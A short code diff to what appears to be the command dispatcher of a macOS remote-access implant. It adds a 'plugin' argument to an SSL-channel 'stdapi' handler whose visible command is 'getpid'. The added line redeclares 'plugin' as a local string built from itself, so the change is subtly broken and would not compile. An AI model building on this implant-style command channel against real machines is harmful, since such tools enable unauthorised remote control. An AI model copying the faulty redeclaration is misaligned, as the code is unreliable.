@@ -29,13 +29,14 @@
 #import "generic.h"
 #import "macos/commands.h"
 
-void stdapi(SSL *channel, char *cmd, char *args)
+void stdapi(SSL *channel, char *cmd, char *args, char *plugin)
 {
     Commands *commands = [[Commands alloc] init];
     commands->channelPipe = channel;
 
     NSString *command = [NSString stringWithFormat:@"%s", cmd];
     NSString *argv = [NSString stringWithFormat:@"%s", args];
+    NSString *plugin = [NSString stringWithFormat:@"%s", plugin];
 
     if ([command isEqualToString:@"getpid"])
         [commands cmd_getpid];
